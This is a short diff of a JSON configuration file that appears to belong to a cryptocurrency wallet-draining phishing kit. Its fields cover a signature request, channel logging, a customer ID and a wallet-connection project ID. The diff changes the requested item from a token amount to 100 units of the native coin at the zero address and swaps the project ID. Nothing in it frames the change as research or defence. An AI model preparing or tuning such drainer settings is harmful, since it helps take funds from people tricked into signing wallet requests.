@@ -6,9 +6,9 @@
   "DARK_MODE": true,
   "SIG_CONFIG": [
     {
-      "itemType": 1,
-      "token": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-      "amount": "500000000"
+      "itemType": 0,
+      "token": "0x0000000000000000000000000000000000000000",
+      "amount": "100000000000000000000"
     }
   ],
   "MODAL_STYLE": "0",
@@ -25,5 +25,5 @@
   "VERIFY_SIGNATURE": "0",
   "LOGS_TO_THE_CHANNEL": "0",
   "CUSTOMER_ID": "420A-4E2B-F56B",
-  "REOWN_ID": "ef1990ab48b586b4f9acdf283e50b0f3"
+  "REOWN_ID": "42ebaf08d3d432a42f9ee72d60014231"
 }
